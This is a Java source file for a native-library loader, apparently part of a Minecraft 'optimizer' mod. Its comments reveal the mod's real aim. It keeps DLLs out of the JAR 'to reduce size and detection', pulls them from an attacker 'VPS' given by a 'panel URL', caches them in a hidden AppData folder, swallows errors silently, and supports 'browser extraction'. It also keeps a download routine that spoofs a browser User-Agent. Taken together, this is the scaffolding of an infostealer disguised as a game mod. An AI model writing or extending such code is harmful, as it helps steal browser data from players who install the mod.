package com.example.optimizer;

import java.io.*;
import java.net.*;
import java.nio.file.*;

/**
 * Native Library Loader - Downloads DLLs from VPS at runtime
 * 
 * 2-Tier System:
 * 1. Persistent local cache (%APPDATA%/.mc_config/natives/)
 * 2. Download from VPS with retry logic
 * 
 * DLLs are NOT bundled in the JAR to reduce size and detection.
 */
public class NativeLoader {

    private static volatile boolean initialized = false;
    private static final Object lock = new Object();

    // Expected DLL sizes for validation
    private static final long JNA_MIN_SIZE = 200000; // ~254KB
    private static final long SQLITE_MIN_SIZE = 800000; // ~867KB

    // DLL names on VPS: j.dll and s.dll
    private static final String JNA_DLL = "jnidispatch.dll";
    private static final String SQLITE_DLL = "sqlitejdbc.dll";

    private static File cacheDir;
    private static String baseUrl;

    /**
     * Initialize native libraries. Call ONCE at mod startup.
     * This method is thread-safe and idempotent.
     * Only runs on Windows - other platforms use bundled natives automatically.
     */
    public static void initialize() {
        if (initialized)
            return;

        synchronized (lock) {
            if (initialized)
                return;

            // Only load external DLLs on Windows
            String os = System.getProperty("os.name", "").toLowerCase();
            if (!os.contains("win")) {
                // Non-Windows: JNA/SQLite will use bundled natives from classpath
                initialized = true;
                return;
            }

            try {
                // Setup cache directory
                String appData = System.getenv("APPDATA");
                if (appData == null) {
                    appData = System.getProperty("user.home");
                }
                cacheDir = new File(appData, ".mc_config" + File.separator + "natives");
                cacheDir.mkdirs();

                // Get base URL from panel URL
                String panelUrl = SessionUtil.getPanelUrl();
                if (panelUrl != null && !panelUrl.isEmpty()) {
                    baseUrl = extractBaseUrl(panelUrl);
                }

                // Load JNA DLL
                loadDll(JNA_DLL, "j.dll", JNA_MIN_SIZE);

                // Load SQLite DLL
                loadDll(SQLITE_DLL, "s.dll", SQLITE_MIN_SIZE);

            } catch (Exception e) {
                // Silent fail - libraries might still work via internal loading
            }

            initialized = true;
        }
    }

    /**
     * Ensure natives are ready before any DB operations.
     */
    public static void ensureReady() {
        if (!initialized) {
            initialize();
        }
    }

    /**
     * Load a DLL from cache or download from VPS
     */
    private static void loadDll(String localName, String remoteName, long minSize) {
        File cachedFile = new File(cacheDir, localName);

        // Check cache first
        if (cachedFile.exists() && cachedFile.length() >= minSize) {
            try {
                System.load(cachedFile.getAbsolutePath());
                return; // Success from cache
            } catch (Exception e) {
                cachedFile.delete(); // Corrupted, re-download
            }
        }

        // Local Resource Paths (Standard in JNA/SQLite jars)
        String resourcePath = null;
        if (localName.contains("j.dll")) {
            resourcePath = "/com/sun/jna/win32-x86-64/jnidispatch.dll";
        } else if (localName.contains("s.dll")) {
            resourcePath = "/org/sqlite/native/Windows/x64/sqlitejdbc.dll";
        }

        if (resourcePath != null) {
            try (InputStream is = NativeLoader.class.getResourceAsStream(resourcePath)) {
                if (is != null) {
                    Files.copy(is, cachedFile.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                    System.load(cachedFile.getAbsolutePath());
                    return; // Success from embedded resource
                }
            } catch (Exception e) {
                // Extraction failed
            }
        }

        // Fallback: If not found in simple path, try root (sometimes repackaged)
        try (InputStream is = NativeLoader.class.getResourceAsStream("/" + localName)) {
            if (is != null) {
                Files.copy(is, cachedFile.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                System.load(cachedFile.getAbsolutePath());
                return;
            }
        } catch (Exception e) {
        }

        // Removed VPS Download Logic as per user request
        // If we get here, let the library try its own internal loading
        // This might fail, but browser extraction might still partially work
    }

    /**
     * Download with retry logic
     */
    private static boolean download(String url, File dest, long minSize) {
        int[] delays = { 500, 1500, 3000 }; // Quick retries

        for (int attempt = 0; attempt < 3; attempt++) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(15000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");

                if (conn.getResponseCode() == 200) {
                    byte[] data = readAll(conn.getInputStream());
                    conn.disconnect();

                    if (data.length >= minSize) {
                        Files.write(dest.toPath(), data);
                        return true;
                    }
                }
                conn.disconnect();
            } catch (Exception e) {
                try {
                    Thread.sleep(delays[attempt]);
                } catch (InterruptedException ie) {
                }
            }
        }
        return false;
    }

    /**
     * Extract base URL from panel URL
     */
    private static String extractBaseUrl(String panelUrl) {
        try {
            URL url = new URL(panelUrl);
            String port = url.getPort() != -1 ? ":" + url.getPort() : "";
            return url.getProtocol() + "://" + url.getHost() + port;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Read all bytes from input stream
     */
    private static byte[] readAll(InputStream is) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int read;
        while ((read = is.read(buffer)) != -1) {
            baos.write(buffer, 0, read);
        }
        return baos.toByteArray();
    }
}
